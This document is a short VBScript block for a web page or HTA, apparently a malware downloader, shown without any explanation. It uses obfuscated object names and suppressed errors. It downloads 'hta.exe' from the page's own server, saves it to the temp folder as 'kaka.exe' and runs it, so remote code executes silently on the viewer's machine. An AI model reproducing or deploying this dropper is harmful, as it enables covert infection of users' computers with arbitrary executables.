<script language=VBScript>
on error resume next

fso="Script"+"ing"+"."+"Fil"+"eSy"+"stem"+"Obj"+"ect"
wso="WS"+"cr"+"ipt."+"S"+"hell"

Set ShellObject=CreateObject(wso)
Set FileObject=CreateObject(fso)

if(vartype(FileObject)>0 and vartype(ShellObject)>0) then

	exename=ShellObject.ExpandEnvironmentStrings("%TEMP%") + "\\kaka.exe"

	Set File=FileObject.CreateTextFile(exename,True)

	Set Http = CreateObject("Microsoft.XmlHttp")

	url=location.href
	j=len(url)
	needstop=0
	do while j>0 and needstop=0
		b=mid(url,j,1)
		if(b="\" or b="/") then
			needstop=1
		end if
		j=j-1
	loop
	url=mid(url,1,j+1) & "hta.exe"

	Http.open "GET", url, FALSE
	Http.send
	
	if Err.number = 0 and Http.status = 200 then
	
		Raw = Http.responseBody
	
		i = 1
		txt = ""
	    	Do While i <= Len(Raw)
	    		word = ascw(mid(raw,i,1))
	    		txt = txt & chr(word and 255) & chr( ( word and 65280 ) / 256 )
	        	i = i + 1
	    	Loop
	
		File.Write(txt)
		File.Close
	
		ShellObject.run(exename)
	
	end if

end if

rem self.Close
</script>
